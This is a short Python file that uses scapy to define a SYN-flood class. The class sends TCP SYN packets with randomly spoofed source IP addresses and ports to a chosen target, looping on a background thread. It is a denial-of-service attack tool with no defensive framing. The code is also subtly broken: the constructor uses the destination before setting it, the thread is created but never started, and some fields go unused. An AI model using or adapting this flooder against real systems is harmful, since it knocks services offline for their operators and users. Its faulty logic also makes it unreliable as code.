import string
from scapy.all import *
from threading import Thread


class Syn:
    def __init__(self, dst, port):
        self.thread = None
        self.synf = IP(src=RandIP(), dst=self.dst, len=65535) / TCP(flags='S', sport=RandShort(), dport=port)
        self.dst = dst
        self.port = port
        self.running = True
        self.intercount = 0
        self.is_running = False
        self.data = (string.ascii_letters + string.digits) * 10
    
    def run(self):
        send(self.synf, verbose=False)
        self.intercount += 1

    def threadf(self):
        while self.is_running:
            self.run()

    def start(self):
        self.is_running = True
        self.thread = Thread(target=self.threadf)
